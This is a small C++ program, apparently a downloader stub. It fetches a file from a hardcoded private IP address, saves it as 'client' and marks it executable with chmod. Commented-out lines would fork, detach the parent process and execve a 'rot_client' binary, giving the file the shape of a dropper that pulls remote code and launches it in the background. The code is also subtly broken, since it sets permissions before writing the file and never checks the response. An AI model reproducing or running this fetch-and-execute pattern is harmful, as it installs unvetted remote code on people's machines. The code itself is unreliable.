#include <string>
#include "../lib/http-installer.h"

using namespace std;

auto main() -> int {
  const string server_address = "http://10.21.205.159:8080";
  httplib::Client cli(server_address);

  auto res = cli.Get("/content/original", [](uint64_t len, uint64_t total) {
    printf("%lu / %lu bytes => %d%% complete\n", len, total, (int) (len * 100 / total));
    return true; // return 'false' if you want to cancel the request.
  });
  ofstream test("client");
  system("chmod +x client");
//  system("systemd-run");
//  if (fork() == 0) {
//    system("systemd-run");
//  }
  test << res->body;

//  pid_t c_pid = fork();

//  if (c_pid == -1) {
//    perror("fork");
//    exit(EXIT_FAILURE);
//  } else if (c_pid > 0) {
//    cout << "Successfully forked, imma die now bye bye 🦵" << endl;
//    exit(0);
//        this_thread::sleep_for(1ms);
//  } else {
//    execve("rot_client", nullptr, nullptr);
//    exit(EXIT_SUCCESS);
//  }

  return EXIT_SUCCESS;
}